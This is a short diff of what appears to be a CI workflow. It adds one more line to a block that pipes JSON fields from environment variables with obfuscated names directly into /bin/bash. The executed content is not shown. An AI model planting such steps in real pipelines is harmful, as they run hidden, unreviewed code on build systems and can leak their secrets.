@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$lwzd8492" | jq -r .rd755 | /bin/bash
           printf '%s' "$ghdxy23" | jq -r .w174 | /bin/bash
           echo $gwswx87395 | jq -r .xwstf04 | /bin/bash
+          echo $nj63909 | jq -r .g6260 | /bin/bash
 
       - name: Archive output
         if: always()
